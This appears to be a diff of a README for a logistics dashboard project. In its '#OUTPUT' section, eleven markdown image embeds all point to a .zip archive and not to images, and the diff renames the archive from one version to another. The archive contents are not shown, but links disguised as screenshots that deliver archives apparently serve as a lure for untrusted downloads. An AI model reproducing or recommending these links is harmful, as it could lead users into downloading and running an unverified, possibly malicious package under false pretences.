@@ -13,15 +13,15 @@ Its clean layout and real-time visuals make it ideal for supply chain monitoring
 This project demonstrates how data visualization can drive smarter logistics through centralized, data-driven storytelling.
 
 #OUTPUT
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
-![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Logistics-Insights-Dashboard-v2.1.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
+![Image](https://github.com/Pranavsiripangi/Logistics-Insights-Dashboard/raw/refs/heads/main/owe/Insights_Dashboard_Logistics_1.6.zip)
 
